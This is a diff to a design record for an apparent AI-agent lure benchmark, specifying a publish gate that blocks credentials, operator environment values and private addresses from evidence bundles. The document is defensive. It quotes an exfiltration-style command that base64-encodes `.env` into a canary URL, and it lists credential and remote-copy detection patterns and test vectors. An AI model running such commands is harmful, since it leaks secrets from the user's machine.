@@ -11,6 +11,10 @@ bare-username check (see "Encoded home spellings"). Amended 2026-11-02: uncondit
 of per-run harness canary token values with `<canary-token-N>` (see "Harness canary tokens").
 Amended 2026-11-03: `--exclude <scenario-id>` (repeatable) for a result that is not a measurement,
 with its own note and manifest field (see "Excluding a scenario"; ADR-0014 amendment).
+Amended 2026-11-05 (block B12): operator-value check (`env_value`), context credential shapes
+(`credential`), private IPv6 / `user@<ip>:` / single-label `host:port` address rules, relative
+detector paths in the evidence record, an evidence-count rule with `--allow-no-evidence`, and
+the plain statement of what the gate checks (see the block B12 amendment).
 Authorises `src/report/publish.ts`, the `publish` subcommand in `src/cli.ts`, the exported
 `findSecretShape()` / `extractHost()` helpers in `src/fixtures/fixture.ts` (and the
 path-before-userinfo order of `extractHost()`), and
@@ -280,6 +284,8 @@ gate unchanged; `test/publish-gate.test.ts` re-gates every file of each one.
   excerpts tighten with the gate. Loopback forms of every URL/host kind, the pseudonyms
   (`<canary-token-N>`, `<user-mcp-N>`, `<HOME>`, `<HOME-SLUG>`), npm package specs
   (`pkg@1.2.3`) and the scenario source URLs are not findings.
+  Extended by the block B12 amendment below: kinds `credential` and `env_value`, private IPv6
+  and `user@<ip>:` remotes, single-label `host:port`.
 - **Allow-URL.** The allow-list is no longer the hosts of the scenario sources (which made every
   `github.com` URL pass, including an operator's private repository). A non-loopback `http(s)`
   URL passes only if it equals, ignoring the fragment (scheme and host compared lowercase), a
@@ -317,6 +323,255 @@ Operator-visible: a URL that used to pass because its host was a scenario source
 `github.com` path, an `arxiv.org` paper that is not a source) now needs `--allow-host <host>`; a
 bundle whose text names the operator's username (4+ chars) fails without `--redact-home`; a
 `--withhold`/`--exclude` publish of a run whose corpus files changed since needs `--scenarios`.
+
+## Amendment (2026-11-05, block B12): operator values, credential shapes, address gaps, relative detector paths, evidence count
+
+Specced before the code (CLAUDE.md). Findings SECURITY-01, SECURITY-05, SECURITY-07, UX-11,
+DOCS-03 and DOCS-14 of `docs/plan/improvement-plan-2026-11-05.md`. Every change makes the gate
+stricter or the bundle more honest; a bundle the gate rejected before is still rejected. The ten
+committed bundles under `reports/`, the `demo/` copy and the CI replay publish pass unchanged:
+every pattern below was run over `reports/`, `demo/`, both replay recordings, the scenario
+corpus and the guides at `4b4357a` with zero matches (`.aab-runs/b12/fp-scan.mjs`, kept out of
+the repository), and `test/publish-gate.test.ts` keeps re-gating every file of each bundle.
+Normative text for the paths and the gate kinds is in evidence-spec s1.5, s2.2 and s5.
+
+- **What the gate checks, stated plainly (replaces the "keeps those inputs safe" sentence of the
+  Consequences).** Evidence records are published verbatim, tool-call inputs included, because
+  those inputs are the audit proof a reader needs (evidence-spec s1.4, s5); a digested copy
+  would be unverifiable, so "input_digest by default" stays rejected (plan, "Rejected or
+  deferred"). The gate is a deny-list of known shapes checked over every published byte: URLs
+  and hosts (the table above and the address rules below), credential shapes (the
+  `SECRET_PATTERNS` families plus the credential shapes below), the values of the variables
+  forwarded to the agent (below), and home paths. It is not a proof that an input is safe: a
+  secret with no known prefix that sits in no assignment, flag, URL or forwarded variable
+  passes. The maintainer reads the evidence of any run that did something unusual before
+  publishing it (`docs/guide/publishing.md`, "Limits"); README.md, the launch article and the
+  publishing guide carry the same sentence as this amendment, never the old "keeps inputs safe"
+  claim.
+- **Operator values (`env_value`, unconditional).** New finding kind. A value the operator's
+  shell or settings handed the agent is the one secret the harness can know without guessing
+  its shape, so the gate compares the bundle against those values and names only the variable.
+  Sources:
+  - the publishing process environment: for every name in the union of
+    `observation.env_forwarded` over the published evidence records that is neither a process
+    basic (`BASE_ENV_ALLOW` names and prefixes in `src/adapters/childEnv.ts`, which includes
+    `AAB_*`) nor listed in `ENV_VALUE_EXEMPT` (new exported constant next to the allow-lists so
+    block B11 maintains the two together: `ANTHROPIC_BASE_URL`, `LLM_BASE_URL`, `LLM_MODEL`,
+    `CURSOR_API_ENDPOINT`, `CODEX_HOME`, `DISABLE_AUTOUPDATER`; URLs and paths in those are judged
+    by the url/host/home rules), the value of that name in the publishing shell, when set. The
+    replay adapter records no `env_forwarded`, so a replay publish (CI) checks nothing here;
+  - the adapter's harness settings file of every kept repetition
+    (`<id>/<rep>/claude-settings.json`, evidence-spec s2.1; written by the Claude Code adapter,
+    never published): the string values of its top-level `env` object, every name. `readRunDir`
+    harvests them exactly as it reads canary metadata: `lstat`, a symlinked file is skipped with
+    the usual warning, a file that is not valid JSON fails the publish closed (nothing written),
+    and the files of withheld or excluded scenarios are not read.
+
+  A value shorter than 8 characters is skipped (shorter values collide with ordinary words; a
+  documented limit), and so is a value equal to the published `profile.model` or
+  `profile.agent_version` (published facts by design). Each remaining value is looked for as a
+  substring, in every scan view of every bundle file after the unconditional rewrites and
+  `--redact-home`, in these spellings: raw; JSON-escaped (`JSON.stringify` without the quotes);
+  percent-encoded (`encodeURIComponent`); base64 standard and base64url, each with and without
+  padding. A match is one finding per file and name: kind `env_value`, detail
+  `value of environment variable NAME present (value redacted)`. The check is a pure function of
+  (bundle files, name->value map); the CLI builds the map from `process.env` and the harvested
+  settings and passes it through `PublishPolicy` (`operatorEnv`) and `RunDirContents`
+  (`settingsEnv`); `scanForLeaks` stays pure. Limits, recorded here: the publishing shell may
+  not be the shell that ran the benchmark (then the variable is unset there and the check is
+  silent for it), and a value the agent transformed in any other way (hashed, split, re-encoded
+  twice) passes; the credential shapes below are the backstop for those.
+- **Credential shapes (`credential`, unconditional).** New finding kind for a credential
+  recognised by its context rather than its prefix. The shapes live in one list,
+  `CREDENTIAL_SHAPES` in `src/report/publish.ts`, separate from `SECRET_PATTERNS`: they are
+  assignment/flag/URL contexts, not token shapes, and fixture inertness must keep accepting lure
+  prose such as `TOKEN=` followed by a canary (which the canary rewrite turns into
+  `<canary-token-N>` before the gate anyway). Scanned per line and over the joined view like the
+  token families; the detail names the shape, never the value. A value that starts with `$`, `<`,
+  `*`, `{`, `%`, `xxx`, `...` or one of the words `REDACTED`, `CHANGEME`, `EXAMPLE`,
+  `PLACEHOLDER` (any case) is a placeholder, not a finding.
+  1. *Assignment:* `NAME=value` where `NAME` (bounded by non-word characters, upper case) contains
+     `PASSWORD`, `PASSWD`, `SECRET`, `TOKEN`, `API_KEY`, `APIKEY`, `ACCESS_KEY`, `PRIVATE_KEY`
+     or `CREDENTIAL(S)`, and `value` is 8+ characters without whitespace or quotes (quotes around
+     it allowed). `export`, `set` and `env` prefixes need no special handling. Detail:
+     `credential assignment NAME=... (value redacted)`.
+  2. *JSON member:* `"NAME": "value"` with the same name family (case-insensitive) and value rule,
+     so a settings `env` block or a `.env` file the agent printed is caught in its JSON spelling.
+  3. *Flag:* `--password`, `--passwd`, `--secret`, `--token`, `--api-key`/`--apikey`,
+     `--access-key` followed by `=` or whitespace and a 4+ character value, not preceded by a word
+     character or `-` (so `canary-token rewrite` in prose is not a flag).
+  4. *Glued `-p<value>`:* after a MySQL-family command word (`mysql`, `mysqladmin`, `mysqldump`,
+     `mysqlsh`, `mariadb`, `mariadb-dump`) on the same command segment (no `|`, `;`, `&` or line
+     break in between), `-p` immediately followed by 2+ non-space characters; and
+     `sshpass -p <value>`. A bare `-p` with a space after it (`claude -p <task>`, `mkdir -p`) is
+     not a finding.
+  5. *URL userinfo password:* any scheme URL `scheme://user:password@host` with a non-empty
+     password, on every host, loopback and allowed hosts included (the host rules skip loopback;
+     this one does not). Detail: `credential in URL userinfo on host "<host>"`.
+  6. *Encoded blob:* a hex run of 40+ characters, or a base64 run of 40+ characters
+     (`[A-Za-z0-9+/_-]`, optional `=` padding) that contains an upper-case letter, a lower-case
+     letter and a digit and no `--` (Markdown anchors and slugs do not qualify), found (a) in the
+     query string or a path segment of any URL the URL pattern matches, loopback included, except
+     the exact scenario source URLs and the two intrinsic URLs, or (b) anywhere in a detector-owned
+     field read structurally from each evidence record: `detector_hits[].matched.requested`,
+     `.argv[]` and `.args` (every string, recursively). Pseudonyms (`<canary-token-N>`) are
+     exempt. The digests at known keys (`scenario_version`, `task_sha256`, `settings_digest`,
+     `input_digest`, `corpus_digest`, `corpus_digest_full`) are never reached: neither a URL nor
+     one of the three fields. Detail: `encoded blob in URL query or path` /
+     `encoded blob in detector field matched.<key>`. Design choice, recorded: the command text
+     `curl <canary-url>?k=$(cat .env | base64)` is a command, not a value, and is not a finding
+     (`$` placeholder rule); the value it produced lands in the egress sink and is published as
+     `matched.requested`, where rule (b) catches it (the review's `curl_b64` case passes by
+     design, `curl_b64_literal` blocks).
+- **Address gaps (`host`, `git_ssh`).** Verified misses of the block-4 patterns, each now a
+  finding; the public-IPv4-without-port and curated-TLD decisions are not reopened (plan,
+  "Rejected or deferred"):
+  - the lookbehinds of `IPV4_PRIVATE_RE` and `IPV4_PORT_RE` drop `@` and `:` (they keep `/`, `.`,
+    `\`, `-`, `_`, `%`, `+` and alphanumerics). Those two characters were there so a host inside a
+    scheme URL is not counted twice, but scheme URLs are blanked from the view (`rest`) before
+    these patterns run, so they only hid the scp, userinfo and IPv4-mapped spellings:
+    `scp . deploy@10.0.0.5:/srv`, `ssh deploy@10.0.0.5` and `::ffff:10.0.0.7` are `host`
+    findings (`private IP address "..."`);
+  - scp-style remote on an IPv4 literal, `user@<ipv4>:path` (any IPv4 that is not loopback or an
+    `--allow-host` host; `GIT_SSH_RE` required an alphabetic TLD), is a `git_ssh` finding
+    (`scp-style remote on host "<ip>"`). A public IPv4 that is not in that form and carries no
+    port stays a non-finding, as decided in block 4;
+  - a bare IPv6 unique-local (`fc00::/7`: `f[cd]xx:`) or link-local (`fe80::/10`: `fe[89ab]x:`)
+    literal, with or without brackets and port, case-insensitive, not preceded by an
+    alphanumeric, `:`, `.` or `-` and not followed by an alphanumeric, `.` or `-`, is a `host`
+    finding (`private IPv6 address "<addr>"`): `fd12:3456::1`, `fe80::1`, `[fd12::1]:22`,
+    `ssh user@fd12:3456::1`. Global IPv6 literals stay out under the same FP budget as public
+    IPv4; `::1` stays loopback;
+  - a single-label host with a port, decided **for** against the FP budget: a label of 2-63
+    characters starting with a letter, `:`, a port of 2-5 digits, preceded by the start of the
+    text, whitespace, a quote, a backtick, `=`, `(` or `[`, and followed by whitespace, a quote,
+    a backtick, `/`, `)`, `,`, `;`, `]` or the end; `localhost` and `--allow-host` labels are
+    skipped. `curl gitlab:8443/api`, `redis:6379` and `db:5432` are `host` findings
+    (`single-label host with port "<label>"`); `at 12:30`, `C:123`, `retry:3`, `sha256:ab...`,
+    `"port":8080` and `file.ts:12` are not. Measured budget: zero matches over the committed
+    bundles, the demo copy, both replay recordings, the corpus and the guides; the override is
+    `--allow-host <label>`. A single-label host without a port (`vault/x`) stays out; with a
+    scheme (`http://vault:8200`) it was already a `url` finding.
+- **Relative detector paths (SECURITY-07).** Besides `evidence_ref`, the runner relativises at
+  write time the three detector-owned absolute run-dir paths: `matched.binDir` and
+  `matched.recorderPath` of `canary_command`, and `matched.path` of `canary_file_read` (both
+  branches). Strings only, and only when the value lies under the run dir (a decoy under an
+  explicit `--workdir` base is left as is, like `workdir` itself); tool-call inputs are never
+  touched (they are what the agent did, evidence-spec s1.4). Verdicts are unchanged; the
+  committed bundles keep their `<HOME>`-redacted absolute form (never edited); a run published
+  from a results dir under the home no longer fails the gate on these three keys alone (the
+  agent's own tool-call inputs still decide). Normative text: evidence-spec s1.5 (canaries are
+  absolute at hand-off), s2.2 (the record stores them relative).
+- **Evidence count (UX-11).** `planPublish` counts the kept evidence files (`found`) against the
+  planned repetitions of the published results (`expected`, the sum of `results[].runs` after
+  `--withhold`/`--exclude`):
+  - `found < expected`: stderr `warning: publish: <found> evidence file(s) for <expected>
+    planned repetition(s); report.md cites evidence files that are not in the bundle`, publish
+    continues;
+  - `found == 0`: refused unless `--allow-no-evidence` is given. Error:
+    `publish: no evidence files under <runDir> (0 of <expected> planned repetitions); a bundle
+    without evidence cannot be audited; nothing written`, then
+    `next: lurekit publish <runDir> --allow-no-evidence   (report-only copy, e.g. the shipped
+    demo)`. With the flag the bundle is written, `index.md` gains a `## Evidence` section with
+    the line `no evidence files published (--allow-no-evidence): 0 of <expected> planned
+    repetition(s); the evidence lines in report.md cite files that are not in this bundle`, and
+    stdout prints `evidence: 0 of <expected> file(s) (--allow-no-evidence)`. With `found > 0`
+    the flag changes nothing. The shipped `demo/<id>` directory (manifest and report.json only)
+    is the intended user of the flag; nothing under `reports/` or `demo/` is re-published;
+  - a successful publish ends with `Next: lurekit report <outDir>` and the line
+    `      cite it as described in the publishing guide ("Citing a bundle")`.
+- **Schema descriptions (DOCS-03; prose only, ajv unaffected, no schema version change).**
+  `schemas/manifest.schema.json`: the `excluded` description becomes "Published bundles only
+  (publish --exclude, ADR-0017 \"Excluding a scenario\"): scenario ids whose results were left
+  out because the operator declared them not a measurement. Each id is absent from results and,
+  since the block-4 amendment, from corpus.scenario_ids; totals cover results only. Never written
+  by the runner; not a disclosure hold (withheld ids are not recorded here)."; `corpus_digest_full`
+  gains "Published reduced bundles only (ADR-0017 \"Corpus block of a reduced bundle\"): the run's
+  original corpus_digest over the full corpus, kept when --withhold/--exclude dropped scenarios and
+  corpus_digest was recomputed over the published ones. Absent from every manifest the runner
+  writes and from a full bundle."
+- **Entry-page wording (DOCS-14).** README.md ("Redaction gate" bullet), the launch article
+  (`docs/launch/article-lurekit-2026-11.md`, the publish paragraph) and the "Limits" section of
+  `docs/guide/publishing.md` describe the gate as this amendment does: raw transcripts and hook
+  logs are never copied, and the gate fails, instead of rewriting, on any URL that is not exactly
+  a scenario source URL (or on a host named with `--allow-host`), on internal and private
+  addresses, on credential-shaped values (known token prefixes, bearer/JWT/PEM, credential
+  assignments and flags, URL passwords, encoded blobs), on the values of the variables forwarded
+  to the agent, and on home paths. The publishing guide's gate table gains the `credential` and
+  `env_value` rows and the extended `host`/`git_ssh` rules.
+- **Deferred, recorded: `--tool-inputs digest`.** An opt-in that replaces tool-call inputs by
+  their digests for a run on a host that is not inert is not built in B12. It alters published
+  facts (Option 2 of this ADR) and needs its own `index.md` note, schema field and reader
+  guidance before it exists; it is never the default.
+
+Operator-visible: a bundle naming a forwarded variable's value, a credential assignment, flag,
+URL password or encoded blob, a private IPv6 or `user@<ip>:` remote, or a single-label
+`host:port` now fails with the kinds above (the override for a host is `--allow-host`; there is
+none for a credential or an operator value: fix the evidence or do not publish that run); a run
+dir without evidence files needs `--allow-no-evidence`; new runs store the three detector paths
+relative to the run dir.
+
+Test plan (block B12; `test/publish-gate.test.ts`, `test/publish.test.ts`, `test/runner.test.ts`;
+offline, credential-shaped vectors assembled at runtime, never literal):
+- B12-T1 gate positives, one per shape, each asserting the kind and that the detail does not
+  contain the value: the SECURITY-01 strings (`mysql -u root -pS3cret...`,
+  `export DB_PASSWORD=...`, `{"requested":"/c/tok?k=<base64 blob>"}`), `--password=...`,
+  `sshpass -p ...`, `"API_TOKEN": "..."` (JSON member), `http://admin:...@127.0.0.1:8080/`
+  (loopback userinfo), a 40-hex blob in a loopback URL query, a blob inside
+  `detector_hits[].matched.args` (structural), `scp . deploy@10.0.0.5:/srv`,
+  `ssh deploy@10.0.0.5`, `::ffff:10.0.0.7`, `rsync -a . backup@10.20.30.40:/mnt` (`git_ssh` on a
+  public IPv4), `fd12:3456::1`, `fe80::1`, `[fd12::1]:22`, `ssh user@fd12:3456::1`,
+  `curl gitlab:8443/api`, `redis:6379`.
+- B12-T2 gate negatives (no finding): `mkdir -p dir`, `claude -p "task"`, `find . -print`,
+  `TOKEN=$GITHUB_TOKEN`, `PASSWORD=<canary-token-1>`, `API_KEY=xxxxxxxxxxxx`,
+  `"token": "<canary-token-2>"`, `canary-token rewrite`, `scenario_version: sha256:<64 hex>`
+  and `input_digest` values (digests at their keys), a Markdown anchor of 40+ lower-case
+  characters and hyphens in a URL fragment, a git commit SHA in a source-URL path,
+  `ping 203.0.113.9` (public IPv4, no port: unchanged decision), `::1`, `at 12:30`, `C:123`,
+  `retry:3`, `"port":8080`, `file.ts:12`, `localhost:3000`, a global IPv6 literal
+  (`2001:db8::1`), the `curl ...?k=$(cat .env | base64)` command text.
+- B12-T3 `env_value`: with `operatorEnv` `{ ANTHROPIC_API_KEY: <runtime-built 24-char value> }`
+  and an evidence record whose `env_forwarded` lists the name, each spelling (raw, JSON-escaped,
+  percent-encoded, base64, base64url, unpadded) in a tool-call input is one finding naming the
+  variable and not the value; the same value under a name absent from `env_forwarded`, under a
+  `BASE_ENV_ALLOW` name (`PATH`), under an `ENV_VALUE_EXEMPT` name, a 7-character value, and a
+  value equal to `profile.model` give no finding; a bundle whose records carry no
+  `env_forwarded` (replay) gives no finding whatever `operatorEnv` holds.
+- B12-T4 settings env: `readRunDir` reads `<id>/<rep>/claude-settings.json` `env` values into
+  `settingsEnv`, skips a symlinked file with the existing warning text, fails closed on invalid
+  JSON, and reads nothing for a withheld or excluded scenario (the file is still never in
+  `plan.files`).
+- B12-T5 re-gating: every committed bundle under `reports/` and `demo/` still yields zero
+  findings with the new patterns (existing `it.each`), and `gateAllowFor` unchanged.
+- B12-T6 relative paths: a runner test with the `canary_command` and `canary_file_read`
+  detectors asserts the written `detector_hits[].matched.binDir`, `.recorderPath` and `.path`
+  do not start with the run dir and resolve to existing files when joined to it; a decoy under an
+  explicit `--workdir` base outside the run dir keeps its absolute path; `tool_calls[].input` is
+  byte-identical to the observation; the replay run of `claude-sample` scores as before
+  (`test/run-lifecycle.test.ts` identity test unchanged).
+- B12-T7 evidence count: `planPublish` with 1 evidence file for `runs: 3` returns `ok: true`
+  with the warning text in `plan.warnings`; with zero evidence files and no flag returns
+  `ok: false` with the error and `next:` text and `leaks: []`; with `allowNoEvidence: true` the
+  plan writes `index.md` with the `## Evidence` section and no `<id>/<rep>/evidence.json`; the
+  CLI prints the stdout line and the `Next:` lines; `lurekit publish demo/<id> --out <scratch>`
+  refuses without the flag and succeeds with it (the existing demo bundle on disk is never
+  touched).
+- B12-T8 `--allow-no-evidence` with evidence present changes no output byte of the bundle
+  (compare `plan.files` with and without the flag).
+- B12-T9 schema descriptions: `manifest.schema.json` still validates every committed
+  `manifest.json` (existing tests) and the `excluded` description no longer contains "stays in".
+- B12-T10 docs: a test greps README.md, the launch article and `docs/guide/publishing.md` for
+  the old phrase "keeps those inputs safe" / "non-allowlisted hosts, credential-shaped tokens and
+  home paths" (must be absent) and for `env_value` and `credential` in the publishing guide's
+  gate table (must be present).
+- Existing: `test/publish.test.ts` fixtures that build `RunDirContents` with fewer evidence
+  files than `results[].runs` now see the count warning; assertions on exact stderr are updated,
+  and fixtures with no evidence pass `allowNoEvidence: true` or gain one file. Verification
+  commands of the block: `npx vitest run test/publish-gate.test.ts test/publish.test.ts`,
+  the review repro scripts (`gate-check.mjs`, `sec05.mjs`, run against this build) must BLOCK the
+  mysql, scp, `::ffff:`, `fd12::` and base64-query cases, `node dist/cli.js publish
+  demo/aab-20261103071018-88a78d8f --out <scratch>` must refuse without `--allow-no-evidence`,
+  and `lurekit report <bundle>` must still render every bundle under `reports/`.
 
 ## Consequences
 - A published number always ships with its manifest and evidence, and never with transcripts.
@@ -369,8 +624,11 @@ bundle whose text names the operator's username (4+ chars) fails without `--reda
 - The rewrite covers only the structured `mcp_servers` field. If the agent actually called a
   tool of an operator server, its `mcp__<server>__<tool>` name in `tool_calls` is a fact of the
   run and is published as is; a maintainer who must not disclose it should not publish that run.
-- Evidence records are published verbatim (save for operator MCP server names and `--redact-home`), including tool-call inputs. The gate, not the
-  renderer, is what keeps those inputs safe to share.
+- Evidence records are published verbatim (save for operator MCP server names, harness canary
+  tokens and `--redact-home`), including tool-call inputs: they are the audit proof. The gate is
+  a deny-list of known shapes, operator values and home paths checked over every published byte
+  (block B12 amendment, "What the gate checks, stated plainly"), not a proof that an input is
+  safe; the maintainer reads the evidence of an unusual run before publishing it.
 - `--withhold` changes the published numbers on purpose: the bundle's headline is over the
   published scenarios only, and the `## Withheld` section says how many were held back, so a
   reader does not mistake the reduced totals for the whole run. It is the maintainer's choice
